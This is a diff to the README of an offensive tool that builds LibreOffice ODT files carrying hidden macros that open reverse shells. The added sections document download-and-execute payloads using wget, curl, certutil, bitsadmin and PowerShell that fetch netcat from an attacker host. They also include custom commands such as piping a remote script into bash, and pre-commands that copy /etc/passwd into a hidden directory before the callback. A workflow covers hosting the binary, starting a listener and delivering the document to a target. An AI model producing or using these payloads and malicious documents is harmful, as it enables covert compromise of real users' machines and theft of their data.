@@ -18,7 +18,7 @@ The target must have LibreOffice installed with macro execution enabled (or acce
 ## Usage
 
 ```
-python3 odt-revshell-generator.py <IP> <PORT> [--os {linux,windows}] [--payload NAME] [-o OUTPUT]
+python3 odt-revshell-generator.py <IP> <PORT> [OPTIONS]
 python3 odt-revshell-generator.py --list [--os {linux,windows}]
 ```
 
@@ -32,6 +32,9 @@ python3 odt-revshell-generator.py --list [--os {linux,windows}]
 | `--payload, -p` | Payload type (see `--list` for all options) |
 | `-o, --output` | Output filename (default: `revshell.odt`) |
 | `--list, -l` | List all available payloads for the selected OS |
+| `--http-port` | Attacker HTTP port for nc download payloads (default: 80) |
+| `--cmd` | Custom command to execute instead of a predefined payload |
+| `--pre-cmd` | Command(s) to run before the main payload (repeatable) |
 
 ### Examples
 
@@ -42,34 +45,41 @@ python3 odt-revshell-generator.py 10.10.14.5 4444
 # Linux — netcat mkfifo (no -e flag needed)
 python3 odt-revshell-generator.py 10.10.14.5 4444 --payload nc-mkfifo
 
-# Linux — Python3 reverse shell
-python3 odt-revshell-generator.py 10.10.14.5 4444 -p python3
+# Linux — download nc from attacker and execute
+python3 odt-revshell-generator.py 10.10.14.5 4444 -p nc-download-wget --http-port 8080
 
-# Linux — Socat interactive PTY
-python3 odt-revshell-generator.py 10.10.14.5 4444 -p socat
+# Linux — download nc via curl from attacker
+python3 odt-revshell-generator.py 10.10.14.5 4444 -p nc-download-curl --http-port 8000
 
-# Linux — OpenSSL encrypted shell
-python3 odt-revshell-generator.py 10.10.14.5 4444 -p openssl
+# Linux — fully custom command
+python3 odt-revshell-generator.py 10.10.14.5 4444 --cmd 'curl http://10.10.14.5:8080/shell.sh|bash'
+
+# Linux — run commands before the reverse shell
+python3 odt-revshell-generator.py 10.10.14.5 4444 --pre-cmd 'mkdir -p /tmp/.x' --pre-cmd 'id > /tmp/.x/w'
 
 # Windows — default PowerShell (base64-encoded)
 python3 odt-revshell-generator.py 10.10.14.5 4444 --os windows
 
-# Windows — PowerShell with TLS encryption
-python3 odt-revshell-generator.py 10.10.14.5 4444 --os windows -p powershell-tls
+# Windows — download nc.exe via certutil from attacker
+python3 odt-revshell-generator.py 10.10.14.5 4444 --os windows -p nc-download-certutil --http-port 8080
 
-# Windows — nc.exe
-python3 odt-revshell-generator.py 10.10.14.5 4444 --os windows -p nc
+# Windows — download nc.exe via bitsadmin
+python3 odt-revshell-generator.py 10.10.14.5 4444 --os windows -p nc-download-bitsadmin --http-port 8080
 
-# List all Linux payloads
+# Windows — download nc.exe via PowerShell WebRequest
+python3 odt-revshell-generator.py 10.10.14.5 4444 --os windows -p nc-download-ps --http-port 8080
+
+# Windows — custom PowerShell command
+python3 odt-revshell-generator.py 10.10.14.5 4444 --os windows --cmd 'Invoke-Expression (New-Object Net.WebClient).DownloadString("http://10.10.14.5/run.ps1")'
+
+# List all payloads
 python3 odt-revshell-generator.py --list
-
-# List all Windows payloads
 python3 odt-revshell-generator.py --list --os windows
 ```
 
 ## Available Payloads
 
-### Linux (19 payloads)
+### Linux (22 payloads)
 
 | Payload | Requires | Description |
 |---------|----------|-------------|
@@ -79,6 +89,9 @@ python3 odt-revshell-generator.py --list --os windows
 | `nc-c` | nc (OpenBSD with -c) | Netcat -c reverse shell |
 | `nc-mkfifo` | nc, mkfifo | Netcat mkfifo (no -e/-c) |
 | `nc-mknod` | nc, mknod | Netcat mknod pipe method |
+| `nc-download-wget` | wget | Download nc from attacker via wget, execute |
+| `nc-download-curl` | curl | Download nc from attacker via curl, execute |
+| `nc-download-fetch` | fetch (FreeBSD) | Download nc from attacker via fetch, execute |
 | `ncat` | ncat | Ncat (Nmap) reverse shell |
 | `ncat-ssl` | ncat | Ncat with SSL encryption |
 | `socat` | socat | Socat interactive PTY shell |
@@ -93,7 +106,7 @@ python3 odt-revshell-generator.py --list --os windows
 | `awk` | gawk | AWK /inet reverse shell |
 | `lua` | lua, luasocket | Lua (luasocket) reverse shell |
 
-### Windows (8 payloads)
+### Windows (11 payloads)
 
 | Payload | Requires | Description |
 |---------|----------|-------------|
@@ -101,10 +114,59 @@ python3 odt-revshell-generator.py --list --os windows
 | `powershell-trycatch` | powershell | PowerShell with error handling |
 | `powershell-tls` | powershell | PowerShell TLS encrypted shell |
 | `nc` | nc.exe on target | nc.exe -e cmd.exe |
+| `nc-download-certutil` | certutil | Download nc.exe from attacker via certutil, execute |
+| `nc-download-ps` | powershell | Download nc.exe from attacker via PowerShell, execute |
+| `nc-download-bitsadmin` | bitsadmin | Download nc.exe from attacker via bitsadmin, execute |
 | `python` | python, powershell | Python reverse shell via PowerShell |
 | `perl` | perl, powershell | Perl reverse shell via PowerShell |
 | `ruby` | ruby, powershell | Ruby reverse shell via PowerShell |
 | `node` | node, powershell | Node.js reverse shell via PowerShell |
+
+## Download & Execute Workflow
+
+When the target doesn't have netcat installed, use the download payloads to fetch it from your attacker machine:
+
+```bash
+# 1. On attacker — host nc binary
+#    Copy the correct nc binary for the target arch into a directory
+cp /usr/bin/nc ./nc          # Linux target
+cp nc.exe ./nc.exe           # Windows target
+python3 -m http.server 8080
+
+# 2. Generate the ODT with a download payload
+python3 odt-revshell-generator.py 10.10.14.5 4444 -p nc-download-wget --http-port 8080
+
+# 3. Start listener
+nc -lvnp 4444
+
+# 4. Deliver the ODT to the target
+```
+
+## Custom Commands
+
+Use `--cmd` to replace the entire payload with any command:
+
+```bash
+# Download and execute a script
+python3 odt-revshell-generator.py 10.10.14.5 4444 --cmd 'wget http://10.10.14.5/payload -O /tmp/p && chmod +x /tmp/p && /tmp/p'
+
+# Run a custom binary
+python3 odt-revshell-generator.py 10.10.14.5 4444 --cmd '/tmp/implant -c2 10.10.14.5:8443'
+```
+
+Use `--pre-cmd` to run commands before the main reverse shell (runs synchronously):
+
+```bash
+# Stage files before callback
+python3 odt-revshell-generator.py 10.10.14.5 4444 \
+  --pre-cmd 'mkdir -p /tmp/.cache' \
+  --pre-cmd 'cp /etc/passwd /tmp/.cache/' \
+  --pre-cmd 'whoami > /tmp/.cache/user'
+
+# Combine pre-commands with any payload
+python3 odt-revshell-generator.py 10.10.14.5 4444 -p python3 \
+  --pre-cmd 'echo pwned > /tmp/proof.txt'
+```
 
 ## Catching the Shell
 
@@ -134,6 +196,7 @@ socat file:`tty`,raw,echo=0 tcp-listen:4444
 - Macro is stored in `Basic/Standard/Module1.xml` inside the ODT ZIP
 - Window style is set to `0` (hidden) for all payloads
 - Complex payloads with quoting issues are automatically base64-encoded for reliable delivery
+- Pre-commands run synchronously (Shell bSync=True) to ensure ordering before the main payload
 
 ## Disclaimer
 
